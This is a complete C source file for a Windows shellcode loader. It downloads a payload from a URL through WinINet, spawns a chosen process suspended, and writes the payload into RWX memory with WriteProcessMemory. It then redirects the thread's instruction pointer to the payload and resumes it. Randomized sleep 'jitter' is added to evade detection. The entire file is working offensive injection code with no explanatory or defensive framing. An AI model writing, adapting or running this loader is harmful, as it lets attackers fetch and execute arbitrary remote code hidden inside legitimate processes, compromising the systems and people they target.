#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

void Jitter(int max_seconds) {
    if (max_seconds <= 0) return;
    int sleep_ms = (rand() % (max_seconds * 1000)) + 1;
    printf("[*] Jitter: sleeping for %d ms...\n", sleep_ms);
    Sleep(sleep_ms);
}

char* DownloadShellcode(const char* url, DWORD* shellcodeSize) {
    HINTERNET hInternet, hUrl;
    char* buffer = NULL;
    DWORD bytesRead;
    DWORD totalSize = 0;

    hInternet = InternetOpen("ShellcodeDownloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) { printf("[-] InternetOpen failed\n"); return NULL; }

    hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hUrl) { printf("[-] InternetOpenUrl failed\n"); InternetCloseHandle(hInternet); return NULL; }
    
    char tempBuffer[4096];
    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        char* newBuffer = (char*)realloc(buffer, totalSize + bytesRead);
        if (!newBuffer) {
            printf("[-] realloc failed\n");
            free(buffer);
            InternetCloseHandle(hUrl); InternetCloseHandle(hInternet);
            return NULL;
        }
        buffer = newBuffer;
        memcpy(buffer + totalSize, tempBuffer, bytesRead);
        totalSize += bytesRead;
    }

    *shellcodeSize = totalSize;
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return buffer;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <process_path> <shellcode_url>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    char* targetProcess = argv[1];
    char* url = argv[2];
    DWORD shellcodeSize = 0;

    char* shellcode = DownloadShellcode(url, &shellcodeSize);
    if (!shellcode) {
        printf("[-] Failed to download shellcode.\n");
        return 1;
    }
    printf("[+] Shellcode downloaded, size: %lu bytes\n", shellcodeSize);
    Jitter(3);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    printf("[+] Spawning process: %s in suspended mode\n", targetProcess);
    if (!CreateProcessA(NULL, targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create process. Error: %lu\n", GetLastError());
        free(shellcode);
        return 1;
    }
    printf("[+] Process created with PID: %lu\n", pi.dwProcessId);
    Jitter(3);

    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[-] Failed to allocate memory. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); free(shellcode);
        return 1;
    }
    printf("[+] Allocated memory at: %p\n", remoteBuffer);
    Jitter(3);

    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        printf("[-] Failed to write shellcode. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); free(shellcode);
        return 1;
    }
    printf("[+] Shellcode written to remote process\n");
    Jitter(3);

    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    context.Rip = (DWORD64)remoteBuffer;
    if (!SetThreadContext(pi.hThread, &context)) {
        printf("[-] SetThreadContext failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); free(shellcode);
        return 1;
    }
    printf("[+] Thread context updated. RIP is pointing to your shellcode.\n");
    Jitter(3);

    printf("[+] Resuming thread...\n");
    ResumeThread(pi.hThread);
    printf("[+] Execution finished.\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(shellcode);

    return 0;
}
